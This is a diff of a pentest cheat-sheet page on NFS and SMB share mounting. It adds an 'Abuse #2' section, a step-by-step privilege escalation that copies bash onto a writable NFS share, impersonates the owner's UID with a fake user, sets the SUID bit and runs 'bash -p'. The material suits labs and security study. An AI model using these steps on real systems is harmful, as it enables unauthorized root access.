@@ -1,11 +1,11 @@
 ---
 title: "Share Mount"
-date: 2024-6-26
-tags: ["NFS", "Mount", "Smb", "File System Mounting", "Enumeration", "Share", "Cifs", "File System Permissions Vulnerabilities"]
+date: 2025-8-3
+tags: ["NFS", "Mount", "SMB", "File System Mounting", "Enumeration", "Share", "Cifs", "File System Permissions Vulnerabilities", "Privilege Escalation", "uid"]
 ---
 
-{{< tab set1 tab1 >}}nfs{{< /tab >}}
-{{< tab set1 tab2 >}}smb{{< /tab >}}
+{{< tab set1 tab1 >}}NFS{{< /tab >}}
+{{< tab set1 tab2 >}}SMB{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### List Shares
@@ -94,7 +94,7 @@ dir \\localhost\c$\users\administrator\desktop
 
 ---
 
-### Abuse #1: Misconfigured Share
+### Abuse #1: Create Fake User to Read Misconfigured Share
 
 ```console
 # Check all mounted drives
@@ -132,20 +132,23 @@ $ cat /etc/exports
 
 ```console
 # Add dummy user
-sudo useradd dummy
+sudo adduser --uid <UID> dummy
 ```
 
 ```console {class="sample-code"}
-$ sudo useradd dummy
-```
-
-```console
-# Change uid
-sudo usermod -u 1001 dummy 
-```
-
-```console {class="sample-code"}
-$ sudo usermod -u 1001 dummy
+$ sudo adduser --uid 1001 dummy
+useradd warning: dummy's uid 1001 outside of the UID_MIN 1000 and UID_MAX 60000 range.
+New password: 
+Retype new password: 
+passwd: password updated successfully
+Changing the user information for dummy
+Enter the new value, or press ENTER for the default
+        Full Name []: dummy
+        Room Number []: 
+        Work Phone []: 
+        Home Phone []: 
+        Other []: 
+Is the information correct? [Y/n] Y
 ```
 
 ```console
@@ -157,4 +160,99 @@ sudo su dummy -c bash
 $ sudo su dummy
 $ id
 uid=1001(dummy) gid=1001(dummy) groups=1001(dummy)
+```
+
+---
+
+### Abuse #2: Writable NFS Share to Privesc
+
+#### 1. Make a '/bin/bash' Copy in Target Machine
+
+```console
+# Copy '/bin/bash' to writable NFS share
+cp /bin/bash .
+```
+
+```console {class="sample-code"}
+(remote) www-data@mail01:/opt/share$ cp /bin/bash .
+```
+
+#### 2. Create a Fake User
+
+```console
+# In local machine
+sudo adduser --uid <UID> <USER>
+```
+
+```console {class="sample-code"}
+$ sudo adduser --uid 1001 fakeuser
+useradd warning: fakeuser's uid 1001 outside of the UID_MIN 1000 and UID_MAX 60000 range.
+New password: 
+Retype new password: 
+passwd: password updated successfully
+Changing the user information for fakeuser
+Enter the new value, or press ENTER for the default
+        Full Name []: fakeuser
+        Room Number []: 
+        Work Phone []: 
+        Home Phone []: 
+        Other []: 
+Is the information correct? [Y/n] Y
+```
+
+#### 3. Get the 'bash' Copy
+
+```console
+# Mount share
+sudo mount -t nfs <TARGET>:<SHARE> /mnt/share/
+```
+
+```console
+# Switch to fakeuser
+su fakeuser
+```
+
+```console
+# Move 'bash' copy to a temp location
+cp /mnt/share/bash /tmp/bash
+```
+
+#### 4. Move the 'bash' Copy Back to Target Machine
+
+```console
+# In target machine
+rm bash
+```
+
+```console
+# Upload the 'bash' copy owned by fakeuser
+cp /tmp/bash /mnt/share
+```
+
+#### 5. Set SUID bit of the 'bash' Copy
+
+```console
+# In local machine
+chmod u+s /mnt/share/bash
+```
+
+#### 6. Privesc
+
+```console
+# In target machine, check
+ls -l
+```
+
+```console {class="sample-code"}
+(remote) www-data@mail01:/opt/share$ ls -la
+total 1380
+drwxrwxrwx 2 nobody                 nogroup      4096 Aug  3 17:23 .
+drwxr-xr-x 4 root                   root         4096 Jun 17  2023 ..
+-rw-r--r-- 1 root                   root         6003 Jun 18  2023 backup.tar.gz
+-rwsr-xr-x 1 peter.turner@example.com 902601108 1396520 Aug  3 17:23 bash
+```
+
+```console
+# Privesc
+./bash -p
 ```
